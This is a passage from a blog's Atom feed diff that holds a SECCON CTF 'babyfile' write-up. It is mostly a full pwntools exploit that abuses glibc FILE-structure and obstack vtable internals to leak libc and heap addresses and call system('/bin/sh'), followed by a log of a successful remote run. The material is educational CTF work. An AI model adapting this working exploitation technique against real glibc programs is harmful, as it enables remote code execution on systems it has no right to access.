+<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span><span class="s1">source /home/nasm/Downloads/pwndbg/gdbinit.py
+</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="kc">None</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+
+<span class="k">class</span> <span class="nc">File</span><span class="p">:</span>
+    <span class="n">flags</span>          <span class="o">=</span> <span class="mh">0x0</span>
+    <span class="n">_IO_read_base</span>  <span class="o">=</span> <span class="mi">24</span>
+    <span class="n">_IO_read_end</span>   <span class="o">=</span> <span class="mh">0x10</span>
+    <span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mh">0x20</span>
+    <span class="n">_IO_write_ptr</span>  <span class="o">=</span> <span class="mh">0x28</span>
+    <span class="n">_IO_write_end</span>  <span class="o">=</span> <span class="mh">0x30</span>
+    <span class="n">_IO_buf_base</span>   <span class="o">=</span> <span class="mh">0x38</span>
+    <span class="n">_IO_buf_end</span>    <span class="o">=</span> <span class="mh">0x40</span>
+    <span class="n">fileno</span>         <span class="o">=</span> <span class="mh">0x70</span>
+    <span class="n">vtable</span>         <span class="o">=</span> <span class="mh">0xd8</span>
+    <span class="n">obstack</span>       <span class="o">=</span> <span class="mh">0xe0</span>
+
+<span class="k">class</span> <span class="nc">obstack</span><span class="p">:</span>
+    <span class="n">chunkfun</span>       <span class="o">=</span> <span class="mi">56</span>
+    <span class="n">extra_arg</span>      <span class="o">=</span> <span class="mi">56</span><span class="o">+</span><span class="mi">16</span>
+    <span class="n">use_extra_arg</span>  <span class="o">=</span> <span class="mi">56</span><span class="o">+</span><span class="mi">16</span><span class="o">+</span><span class="mi">8</span>
+
+<span class="k">def</span> <span class="nf">fflush</span><span class="p">():</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">trick</span><span class="p">(</span><span class="n">offt</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;offset: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">offt</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;value: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">leave</span><span class="p">():</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;0&#34;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">write_ptr</span><span class="p">(</span><span class="n">ptr</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">offt</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span>
+            <span class="n">trick</span><span class="p">(</span><span class="n">offt</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="k">def</span> <span class="nf">partial_write2</span><span class="p">(</span><span class="n">ptr</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">offt</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
+        <span class="n">trick</span><span class="p">(</span><span class="n">offt</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="k">def</span> <span class="nf">partial_write</span><span class="p">(</span><span class="n">ptr</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">offt</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+        <span class="n">trick</span><span class="p">(</span><span class="n">offt</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="k">def</span> <span class="nf">leak_ptr</span><span class="p">(</span><span class="n">ptr</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+    <span class="n">write_ptr</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_write_base</span><span class="p">)</span>
+    
+    <span class="n">dest</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">)</span>
+
+    <span class="n">write_ptr</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_write_ptr</span><span class="p">)</span>
+
+    <span class="n">fflush</span><span class="p">()</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+
+    <span class="k">return</span> <span class="n">ret</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="c1"># do_allocate</span>
+    <span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xa8</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">vtable</span><span class="p">)</span>
+    <span class="n">fflush</span><span class="p">()</span>
+
+    <span class="c1"># _IO_file_underflow =&gt; _IO_default_pbackfail</span>
+    <span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x60</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">vtable</span><span class="p">)</span>
+    <span class="n">fflush</span><span class="p">()</span>
+
+    <span class="s2">&#34;&#34;&#34;
+</span><span class="s2">    int
+</span><span class="s2">    _IO_default_pbackfail (FILE *fp, int c)
+</span><span class="s2">    =&gt; not _IO_IN_BACKUP         0x0100
+</span><span class="s2">    =&gt; _IO_read_base == _IO_write_ptr
+</span><span class="s2">    =&gt; _IO_read_end == _IO_write_ptr + 8
+</span><span class="s2">    =&gt; _IO_write_end = right size
+</span><span class="s2">    &#34;&#34;&#34;</span>
+
+    <span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span> <span class="o">|</span> <span class="mh">0x8000</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">flags</span><span class="p">)</span>
+
+    <span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x70</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_write_base</span><span class="p">)</span>
+
+    <span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x78</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_write_ptr</span><span class="p">)</span>
+    <span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">vtable</span><span class="p">)</span>
+    <span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">fileno</span><span class="p">)</span>
+    <span class="n">fflush</span><span class="p">()</span>
+
+    <span class="n">leak</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x2160c0</span> <span class="o">+</span> <span class="mh">0x2d160</span>
+    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span>
+
+    <span class="n">leak_main_arena</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">+</span> <span class="mh">0x1ed5a0</span>
+
+    <span class="n">heap</span> <span class="o">=</span> <span class="n">leak_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">leak_main_arena</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x2a0</span>
+    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+
+    <span class="n">_IO_obstack_jumps</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">+</span> <span class="mh">0x1E9260</span>
+    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;_IO_obstack_jumps: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">_IO_obstack_jumps</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+
+    <span class="c1"># edit vtable =&gt; _IO_obstack_jumps</span>
+    <span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">_IO_obstack_jumps</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">9</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">vtable</span><span class="p">)</span>
+    <span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x2a0</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">obstack</span><span class="p">)</span>
+
+    <span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xff</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_read_base</span><span class="p">)</span>
+
+    <span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">),</span> <span class="n">obstack</span><span class="o">.</span><span class="n">chunkfun</span><span class="p">)</span> <span class="c1"># fn ptr, system</span>
+    <span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))),</span> <span class="n">obstack</span><span class="o">.</span><span class="n">extra_arg</span><span class="p">)</span> <span class="c1"># arg</span>
+    <span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="kc">True</span><span class="p">),</span> <span class="n">obstack</span><span class="o">.</span><span class="n">use_extra_arg</span><span class="p">)</span>
+
+    <span class="n">fflush</span><span class="p">()</span>
+    <span class="c1"># system(&#34;/bin/sh&#34;)</span>
+
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;cat flag-f81d1f481db83712a1128dc9b72d5503.txt&#34;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+
+<span class="s2">&#34;&#34;&#34;
+</span><span class="s2">type = struct _IO_FILE {
+</span><span class="s2">/*      0      |       4 */    int _flags;
+</span><span class="s2">/* XXX  4-byte hole      */
+</span><span class="s2">/*      8      |       8 */    char *_IO_read_ptr;
+</span><span class="s2">/*     16      |       8 */    char *_IO_read_end;
+</span><span class="s2">/*     24      |       8 */    char *_IO_read_base;
+</span><span class="s2">/*     32      |       8 */    char *_IO_write_base;
+</span><span class="s2">/*     40      |       8 */    char *_IO_write_ptr;
+</span><span class="s2">/*     48      |       8 */    char *_IO_write_end;
+</span><span class="s2">/*     56      |       8 */    char *_IO_buf_base;
+</span><span class="s2">/*     64      |       8 */    char *_IO_buf_end;
+</span><span class="s2">/*     72      |       8 */    char *_IO_save_base;
+</span><span class="s2">/*     80      |       8 */    char *_IO_backup_base;
+</span><span class="s2">/*     88      |       8 */    char *_IO_save_end;
+</span><span class="s2">/*     96      |       8 */    struct _IO_marker *_markers;
+</span><span class="s2">/*    104      |       8 */    struct _IO_FILE *_chain;
+</span><span class="s2">/*    112      |       4 */    int _fileno;
+</span><span class="s2">/*    116      |       4 */    int _flags2;
+</span><span class="s2">/*    120      |       8 */    __off_t _old_offset;
+</span><span class="s2">/*    128      |       2 */    unsigned short _cur_column;
+</span><span class="s2">/*    130      |       1 */    signed char _vtable_offset;
+</span><span class="s2">/*    131      |       1 */    char _shortbuf[1];
+</span><span class="s2">/* XXX  4-byte hole      */
+</span><span class="s2">/*    136      |       8 */    _IO_lock_t *_lock;
+</span><span class="s2">/*    144      |       8 */    __off64_t _offset;
+</span><span class="s2">/*    152      |       8 */    struct _IO_codecvt *_codecvt;
+</span><span class="s2">/*    160      |       8 */    struct _IO_wide_data *_wide_data;
+</span><span class="s2">/*    168      |       8 */    struct _IO_FILE *_freeres_list;
+</span><span class="s2">/*    176      |       8 */    void *_freeres_buf;
+</span><span class="s2">/*    184      |       8 */    size_t __pad5;
+</span><span class="s2">/*    192      |       4 */    int _mode;
+</span><span class="s2">/*    196      |      20 */    char _unused2[20];
+</span><span class="s2">
+</span><span class="s2">                               /* total size (bytes):  216 */
+</span><span class="s2">                             }
+</span><span class="s2">
+</span><span class="s2">struct obstack          /* control current object in current chunk */
+</span><span class="s2">{
+</span><span class="s2">  long chunk_size;              /* preferred size to allocate chunks in */
+</span><span class="s2">  struct _obstack_chunk *chunk; /* address of current struct obstack_chunk */
+</span><span class="s2">  char *object_base;            /* address of object we are building */
+</span><span class="s2">  char *next_free;              /* where to add next char to current object */
+</span><span class="s2">  char *chunk_limit;            /* address of char after current chunk */
+</span><span class="s2">  union
+</span><span class="s2">  {
+</span><span class="s2">    PTR_INT_TYPE tempint;
+</span><span class="s2">    void *tempptr;
+</span><span class="s2">  } temp;                       /* Temporary for some macros.  */
+</span><span class="s2">  int alignment_mask;           /* Mask of alignment for each object. */
+</span><span class="s2">  /* These prototypes vary based on &#39;use_extra_arg&#39;, and we use
+</span><span class="s2">     casts to the prototypeless function type in all assignments,
+</span><span class="s2">     but having prototypes here quiets -Wstrict-prototypes.  */
+</span><span class="s2">  struct _obstack_chunk *(*chunkfun) (void *, long);
+</span><span class="s2">  void (*freefun) (void *, struct _obstack_chunk *);
+</span><span class="s2">  void *extra_arg;              /* first arg for chunk alloc/dealloc funcs */
+</span><span class="s2">  unsigned use_extra_arg : 1;     /* chunk alloc/dealloc funcs take extra arg */
+</span><span class="s2">  unsigned maybe_empty_object : 1; /* There is a possibility that the current
+</span><span class="s2">				      chunk contains a zero-length object.  This
+</span><span class="s2">				      prevents freeing the chunk if we allocate
+</span><span class="s2">				      a bigger chunk to replace it. */
+</span><span class="s2">  unsigned alloc_failed : 1;      /* No longer used, as we now call the failed
+</span><span class="s2">				     handler on error, but retained for binary
+</span><span class="s2">				     compatibility.  */
+</span><span class="s2">};
+</span><span class="s2">
+</span><span class="s2">nasm@off:~/Documents/pwn/seccon/babyfile$ time python3 exploit.py REMOTE HOST=babyfile.seccon.games PORT=3157
+</span><span class="s2">[*] &#39;/home/nasm/Documents/pwn/seccon/babyfile/chall&#39;
+</span><span class="s2">    Arch:     amd64-64-little
+</span><span class="s2">    RELRO:    Full RELRO
+</span><span class="s2">    Stack:    Canary found
+</span><span class="s2">    NX:       NX enabled
+</span><span class="s2">    PIE:      PIE enabled
+</span><span class="s2">[*] &#39;/home/nasm/Documents/pwn/seccon/babyfile/libc-2.31.so&#39;
+</span><span class="s2">    Arch:     amd64-64-little
+</span><span class="s2">    RELRO:    Partial RELRO
+</span><span class="s2">    Stack:    Canary found
+</span><span class="s2">    NX:       NX enabled
+</span><span class="s2">    PIE:      PIE enabled
+</span><span class="s2">[+] Opening connection to babyfile.seccon.games on port 3157: Done
+</span><span class="s2">[*] libc: 0x7fe2bc538000
+</span><span class="s2">[*] heap: 0x55fd27776000
+</span><span class="s2">[*] _IO_obstack_jumps: 0x7fe2bc721260
+</span><span class="s2">[*] Switching to interactive mode
+</span><span class="s2">SECCON</span><span class="si">{r34d_4nd_wr173_4nywh3r3_w17h_f1l3_57ruc7ur3}</span><span class="s2">
+</span><span class="s2">[*] Got EOF while reading in interactive
+</span><span class="s2">$
+</span><span class="s2">&#34;&#34;&#34;</span>
+</code></pre></div>
+  </div>
+</div>
+
+]]></content>
+            
+                 
+                    
+                 
+                    
+                         
+                        
+                            
+                             
+                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
+                             
+                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
+                             
+                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
+                             
+                                <category scheme="https://nasm.re/tags/linux" term="linux" label="linux" />
+                             
+                                <category scheme="https://nasm.re/tags/file-stream" term="file-stream" label="file stream" />
+                             
+                                <category scheme="https://nasm.re/tags/SECCON" term="SECCON" label="SECCON" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
         
         <entry>
             <title type="html"><![CDATA[Linux file stream internals for fun and profit]]></title>
